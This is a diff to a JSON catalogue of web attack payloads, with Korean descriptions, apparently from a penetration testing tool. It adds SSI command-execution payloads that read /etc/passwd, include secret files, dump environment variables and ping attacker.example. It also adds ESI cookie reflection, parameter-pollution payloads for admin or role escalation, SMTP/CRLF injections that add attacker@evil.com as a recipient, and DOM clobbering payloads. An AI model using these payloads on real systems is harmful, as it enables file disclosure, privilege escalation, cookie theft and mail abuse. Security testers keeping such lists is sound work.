@@ -4031,6 +4031,41 @@
           "description": "ESI 경유 XSS",
           "risk": "high",
           "reference": "https://book.hacktricks.xyz/pentesting-web/esi-injection"
+        },
+        {
+          "id": "ssi_exec_passwd",
+          "name": "SSI exec cat passwd",
+          "payload": "<!--#exec cmd=\"cat /etc/passwd\"-->",
+          "description": "SSI 명령 실행으로 파일 읽기.",
+          "risk": "high"
+        },
+        {
+          "id": "ssi_include_file",
+          "name": "SSI include file",
+          "payload": "<!--#include file=\"secret.txt\"-->",
+          "description": "상대경로 파일 포함(virtual 과 별개).",
+          "risk": "high"
+        },
+        {
+          "id": "ssi_printenv",
+          "name": "SSI printenv",
+          "payload": "<!--#printenv-->",
+          "description": "서버 환경변수 전체 노출.",
+          "risk": "high"
+        },
+        {
+          "id": "ssi_exec_oob",
+          "name": "SSI OOB ping",
+          "payload": "<!--#exec cmd=\"ping -c1 attacker.example\"-->",
+          "description": "명령 실행 OOB 콜백으로 blind 확인.",
+          "risk": "high"
+        },
+        {
+          "id": "esi_vars_cookie",
+          "name": "ESI vars 쿠키 노출",
+          "payload": "<esi:vars>$(HTTP_COOKIE)</esi:vars>",
+          "description": "ESI 변수로 요청 쿠키 반사.",
+          "risk": "high"
         }
       ],
       "group": "server"
@@ -4193,6 +4228,34 @@
           "description": "인코딩된 구분자",
           "risk": "medium",
           "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/HTTP%20Parameter%20Pollution"
+        },
+        {
+          "id": "hpp_role",
+          "name": "권한 파라미터 오염",
+          "payload": "role=user&role=admin",
+          "description": "동일 파라미터 중복으로 권한 값 우회(서버 파싱차 악용).",
+          "risk": "medium"
+        },
+        {
+          "id": "hpp_bool",
+          "name": "불린 플래그 오염",
+          "payload": "debug=false&debug=true",
+          "description": "플래그를 마지막/처음 값으로 뒤집기.",
+          "risk": "medium"
+        },
+        {
+          "id": "hpp_admin",
+          "name": "admin 플래그 오염",
+          "payload": "admin=0&admin=1",
+          "description": "권한 상승 시도.",
+          "risk": "medium"
+        },
+        {
+          "id": "hpp_semicolon",
+          "name": "세미콜론 구분 오염",
+          "payload": "id=1;id=2",
+          "description": "일부 서버는 ; 를 파라미터 구분자로 처리.",
+          "risk": "medium"
         }
       ],
       "group": "http"
@@ -4299,6 +4362,27 @@
           "description": "발신자 위조",
           "risk": "medium",
           "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection"
+        },
+        {
+          "id": "email_smtp_rcpt",
+          "name": "SMTP RCPT 주입",
+          "payload": "x@x.com>%0d%0aRCPT TO:<attacker@evil.com",
+          "description": "SMTP 명령 주입으로 수신자 추가.",
+          "risk": "medium"
+        },
+        {
+          "id": "email_multi",
+          "name": "다중 헤더+본문 주입",
+          "payload": "x@x.com%0d%0aBcc: attacker@evil.com%0d%0aSubject: pwn%0d%0a%0d%0abody",
+          "description": "Bcc/Subject/본문 동시 주입.",
+          "risk": "medium"
+        },
+        {
+          "id": "email_ctype",
+          "name": "Content-Type 주입(HTML 메일)",
+          "payload": "x@x.com%0d%0aContent-Type: text/html",
+          "description": "HTML 메일로 전환해 피싱 강화.",
+          "risk": "medium"
         }
       ],
       "group": "http"
@@ -4737,6 +4821,34 @@
           "description": "폼 요소로 속성 덮기 · 내 정리노트",
           "risk": "medium",
           "reference": "https://portswigger.net/web-security/dom-based/dom-clobbering"
+        },
+        {
+          "id": "domclob_body",
+          "name": "document.body 덮기",
+          "payload": "<img name=body>",
+          "description": "name=body 로 document.body 참조 오염.",
+          "risk": "medium"
+        },
+        {
+          "id": "domclob_nodename",
+          "name": "nodeName 덮기",
+          "payload": "<form id=x><input name=nodeName value=INPUT></form>",
+          "description": "속성 클로버링으로 스크립트 분기 오염.",
+          "risk": "medium"
+        },
+        {
+          "id": "domclob_toString",
+          "name": "2요소 toString 클로버",
+          "payload": "<a id=obj><a id=obj name=prop>",
+          "description": "동일 id 2개로 HTMLCollection→값 오염.",
+          "risk": "medium"
+        },
+        {
+          "id": "domclob_embeds",
+          "name": "embeds 덮기",
+          "payload": "<embed name=embeds src=about:blank>",
+          "description": "document.embeds 컬렉션 오염.",
+          "risk": "medium"
         }
       ]
     },
